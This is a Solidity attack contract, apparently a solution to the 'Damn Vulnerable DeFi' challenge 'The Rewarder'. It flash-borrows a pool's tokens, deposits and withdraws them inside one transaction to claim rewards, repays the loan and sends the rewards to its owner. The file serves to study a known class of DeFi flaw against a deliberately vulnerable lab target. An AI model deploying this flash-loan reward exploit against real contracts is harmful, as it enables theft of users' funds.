// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewardAttack is Ownable, ReentrancyGuard {
    FlashLoanerPool public immutable loanerPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    constructor(address loanerPoolAddress, address liquidityTokenAddress, address rewarderPoolAddress) Ownable() {
        loanerPool = FlashLoanerPool(loanerPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    modifier onlyLoaner() {
        require(address(loanerPool) == _msgSender());
        console.log(address(loanerPool));
        _;
    }


    function start() public onlyOwner{
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        loanerPool.flashLoan(liquidityToken.balanceOf(address(loanerPool)));
        // last return reward
        RewardToken rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(owner(), rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external onlyLoaner {
        uint bal = liquidityToken.balanceOf(address(this));
        rewarderPool.deposit(bal);
        rewarderPool.withdraw(bal);
        liquidityToken.transfer(address(loanerPool), bal);
    }
}
